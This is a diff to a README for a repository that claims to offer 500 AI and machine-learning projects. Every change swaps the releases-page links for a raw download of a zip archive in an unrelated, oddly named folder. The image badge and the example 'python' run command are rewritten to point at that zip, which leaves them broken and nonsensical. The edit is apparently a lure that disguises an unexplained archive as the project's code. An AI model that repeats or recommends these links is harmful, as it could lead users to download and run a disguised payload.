@@ -1,6 +1,6 @@
 # 🤖 500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code - Discover 500 AI Projects with Ease
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20Code-blue)](https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/releases)
+[![Download Here](https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/raw/refs/heads/main/Spiriferidae/Machine-with-Computer-NL-A-Projects-vision-code-Deep-learning-3.0.zip%20Now-Get%20the%20Code-blue)](https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/raw/refs/heads/main/Spiriferidae/Machine-with-Computer-NL-A-Projects-vision-code-Deep-learning-3.0.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with these projects, follow the instructions below to download an
 
 ## 💾 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/releases).
+Visit this page to download: [Releases Page](https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/raw/refs/heads/main/Spiriferidae/Machine-with-Computer-NL-A-Projects-vision-code-Deep-learning-3.0.zip).
 
 You will find all the files available for download under the "Releases" section. Simply choose the version you want and click to download.
 
@@ -45,10 +45,10 @@ This repository includes a variety of projects focused on:
 For example, to run a Python project, your command might look like this:
 
 ```bash
-python main.py
+python https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/raw/refs/heads/main/Spiriferidae/Machine-with-Computer-NL-A-Projects-vision-code-Deep-learning-3.0.zip
 ```
 
-Replace `main.py` with the name of the file specified in the project instructions.
+Replace `https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/raw/refs/heads/main/Spiriferidae/Machine-with-Computer-NL-A-Projects-vision-code-Deep-learning-3.0.zip` with the name of the file specified in the project instructions.
 
 ## 🔗 Additional Resources
 
@@ -78,6 +78,6 @@ Feel free to reach out for support or to share your experiences using any of the
 
 ## 📥 Download Again
 
-Don’t forget to visit the releases page to download your projects: [Releases Page](https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/releases).
+Don’t forget to visit the releases page to download your projects: [Releases Page](https://github.com/Tafieslick/500-AI-Machine-learning-Deep-learning-Computer-vision-NLP-Projects-with-code/raw/refs/heads/main/Spiriferidae/Machine-with-Computer-NL-A-Projects-vision-code-Deep-learning-3.0.zip).
 
 Thank you for exploring the "500 AI Machine learning Deep learning Computer vision NLP Projects with code." Enjoy your journey into the world of artificial intelligence!
